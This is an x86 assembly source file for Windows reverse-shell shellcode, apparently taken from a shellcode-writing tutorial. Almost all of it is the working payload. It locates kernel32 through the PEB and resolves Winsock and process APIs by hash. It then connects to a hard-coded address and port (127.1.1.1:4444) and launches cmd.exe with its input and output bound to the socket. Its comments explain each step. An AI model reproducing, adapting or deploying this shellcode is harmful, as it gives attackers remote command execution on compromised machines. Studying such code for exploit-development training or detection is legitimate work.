;reverse.asm - original code from - http://www.projectshellcode.com:80/?q=node/24

[SECTION .text]

BITS 32

global _start

_start:
	jmp start_asm

	; DEFINE FUNCTIONS

	; ====== Function: find_kernel32
	find_kernel32:
		push esi
		xor eax, eax
		mov eax, [fs:eax+0x30]
		test eax, eax
		js find_kernel32_9x
	find_kernel32_nt:
		mov eax, [eax+0x0C]
		mov esi, [eax+0x1C]
		lodsd
		mov eax, [eax+0x08]
		jmp find_kernel32_finished
	find_kernel32_9x:
		mov eax, [eax+0x34]
		lea eax, [eax+0x7C]
		mov eax, [eax+0x3C]
	find_kernel32_finished:
		pop esi
		ret

	; ====== Function: find_function
	find_function:
		pushad
		mov ebp, [esp+0x24]
		mov eax, [ebp+0x3C]
		mov edx, [ebp+eax+0x78]
		add edx, ebp
		mov ecx, [edx+0x18]
		mov ebx, [edx+0x20]
		add ebx, ebp
	find_function_loop:
		jecxz find_function_finished
		dec ecx
		mov esi, [ebx+ecx*4]
		add esi, ebp
	compute_hash:
		xor edi, edi
		xor eax, eax
		cld
	compute_hash_again:
		lodsb
		test al, al
		jz compute_hash_finished
		ror edi, 0x0D
		add edi, eax
		jmp compute_hash_again
	compute_hash_finished:
	find_function_compare:
		cmp edi, [esp+0x28]
		jnz find_function_loop
		mov ebx, [edx+0x24]
		add ebx, ebp
		mov cx, [ebx+2*ecx]
		mov ebx, [edx+0x1C]
		add ebx, ebp
		mov eax, [ebx+4*ecx]
		add eax, ebp
		mov [esp+0x1C], eax
	find_function_finished:
		popad
		ret

	; ===== Function: resolve_symbols_for_dll
	resolve_symbols_for_dll:
		lodsd
		push eax
		push edx
		call find_function
		mov [edi], eax
		add esp, 0x08
		add edi, 0x04
		cmp esi, ecx
		jne resolve_symbols_for_dll
	resolve_symbols_for_dll_finished:
		ret

	; ====== Constants
	locate_kernel32_hashes:
		call locate_kernel32_hashes_return
		;LoadLibraryA
		db 0x8E
		db 0x4E
		db 0x0E
		db 0xEC

		;CreateProcessA
		db 0x72
		db 0xFE
		db 0xB3
		db 0x16

		;ExitProcess
		db 0x7E
		db 0xD8
		db 0xE2
		db 0x73

		;locate_ws2_32_hashes:
		;WSASocketA
		db 0xD9
		db 0x09
		db 0xF5
		db 0xAD

		;connect
		db 0xEC
		db 0xF9
		db 0xAA
		db 0x60

		;WSAStartup
		db 0xCB
		db 0xED
		db 0xFC
		db 0x3B

	start_asm: ; start our main program
		sub esp, 0x68 ; allocate space on stack for function addresses
		mov ebp, esp ; set ebp as frame ptr for relative offset on stack
		call find_kernel32 ;find address of Kernel32.dll
		mov edx, eax

		;resolve kernel32 symbols
		jmp short locate_kernel32_hashes ;locate address of our hashes
	locate_kernel32_hashes_return: ;define return label to return to this code
		pop esi ;get constants address from stack
		lea edi, [ebp + 0x04] ;this is where we store our function addresses
		mov ecx, esi
		add ecx, 0x0C ;length of kernel32 hash list
		call resolve_symbols_for_dll

		;resolve ws2_32 symbols
		add ecx, 0x0C ;length of ws2_32 hash list

		;create the string ws2_32 on the stack
		xor eax, eax
		mov ax, 0x3233
		push eax
		push dword 0x5f327377
		mov ebx, esp ;ebx now points to "ws2_32"
		push ecx
		push edx
		push ebx
		call [ebp + 0x04] ;call LoadLibraryA(ws2_32)
		pop edx ;edx now holds location of ws2_32.dll
		pop ecx
		mov edx, eax
		call resolve_symbols_for_dll
	initialize_cmd: ;push the string "cmd" onto the stack
		mov eax, 0x646d6301
		sar eax, 0x08
		push eax
		mov [ebp + 0x30], esp
	WSAStartup: ;initialise networking
		xor edx,edx ;make some stack space
		mov dh, 0x03 ;sizeof(WSADATA) is 0x190
		sub esp, edx

		;initialize winsock
		push esp ;use stack for WSADATA
		push 0x02 ;wVersionRequested
		call [ebp + 18h] ;call WSAStartup
		add esp, 0x0300 ;move esp over WSAData

		;SECTION: start custom shellcode
	create_socket: ;same as portbind
		xor eax, eax ;zero eax
		push eax ;Push the dwFlags argument to WSASocket as 0.
		push eax ;Push the g argument to WSASocket as 0.
		push eax ;Push the lpProtocolInfo argument to WSASocket as NULL.
		push eax ;Push the protocol argument to WSASocket as 0.
		inc eax ;Increment eax to 1.
		push eax ;Push the type argument to WSASocket as SOCK STREAM.
		inc eax ;Increment eax to 2.
		push eax ;Push the af argument to WSASocket as AF INET.
		call [ebp + 0x10] ;Call WSASocket to allocate a socket for later use.
		mov esi, eax ;Save the socket file descriptor in esi.
	do_connect:
		push 0x0101017f ;Push the address of the remote machine to connect to in network-byte order. In this case 127.1.1.1 has been used.
		mov eax, 0x5c110102 ;Set the high order bytes of eax to the port to connect to in networkbyte order (4444). The low order bytes should be set to the family, in this case AF INET3.
		dec ah ;Decrement the second byte of eax to get it to zero and have the family be correctly set to AF INET.
		push eax ;Push the sin port and sin family attributes.
		mov ebx, esp ;Set ebx to the pointer to the struct sockaddr in that has been initialized on the stack.
		xor eax, eax ;Zero eax.
		mov al, 0x10 ;Set the low order byte of eax to 16 to represent the size of the struct sockaddr in.
		push eax ;Push the namelen argument which has been set to 16.
		push ebx ;Push the name argument which has been set to the initialized struct sockaddr in on the stack.
		push esi ;Push the s argument as the file descriptor that was previously returned from WSASocket.
		call [ebp + 0x14] ;Call connect to establish a TCP connection to the remote machine on the specified port.
	initialize_process:
		xor ecx, ecx ;Zero ecx.
		mov cl, 0x54 ;Set the low order byte of ecx to 0x54 which will be used to represent the size of the STARTUPINFO and PROCESS INFORMATION structures on the stack.
		sub esp, ecx ;Allocate stack space for the two structures.
		mov edi, esp ;Set edi to point to the STARTUPINFO structure.
		push edi ;Preserve edi on the stack as it will be modified by the following instructions.
	zero_structs:
		xor eax, eax ;Zero eax to for use with stosb to zero out the two structures.
		rep stosb ;Repeat storing zero at the buffer starting at edi until ecx is zero.
		pop edi ;Restore edi to its original value.
	initialize_structs:
		mov byte[edi], 0x44 ;Set the cb attribute of STARTUPINFO to 0x44 (the size of the structure).
		inc byte[edi + 0x2d] ;Set the STARTF USESTDHANDLES flag to indicate that the hStdInput, hStdOutput, and hStdError attributes should be used.
		push edi ;Preserve edi again as it will be modified by the stosd.
		mov eax, esi ;Set eax to the client file descriptor that was returned by accept
		lea edi, [edi + 0x38] ;Load the effective address of the hStdInput attribute in the STARTUPINFO structure.
		stosd ;Set the hStdInput attribute to the file descriptor returned from accept.
		stosd ;Set the hStdOutput attribute to the file descriptor returned from accept.
		stosd ;Set the hStdError attribute to the file descriptor returned from accept.
		pop edi ;Restore edi to its original value.
	execute_process:
		xor eax, eax ;Zero eax for use with passing zerod arguments.
		lea esi, [edi + 0x44] ;Load the effective address of the PROCESS INFORMATION structure into esi.
		push esi ;Push the pointer to the lpProcessInformation structure.
		push edi ;Push the pointer to the lpStartupInfo structure.
		push eax ;Push the lpStartupDirectory argument as NULL.
		push eax ;Push the lpEnvironment argument as NULL
		push eax ;Push the dwCreationFlags argument as 0.
		inc eax ;Increment eax to 1.
		push eax ;Push the bInheritHandles argument as TRUE due to the fact that the client needs to inherit the socket file descriptor.
		dec eax ;Decrement eax back to zero.
		push eax ;Push the lpThreadAttributes argument as NULL.
		push eax ;Push the lpProcessAttributes argument as NULL.
		push dword [ebp + 0x30] ;Push the lpCommandLine argument as the pointer to cmd. Only change in this section to portbind.
		push eax ;Push the lpApplicationName argument as NULL.
		call [ebp + 0x08] ;Call CreateProcessA to created the child process that has its input and output redirected from and to the remote machine via the TCP connection.
	exit_process:
		call [ebp + 0x0c] ;Call ExitProcess as the parent no longer needs to execute
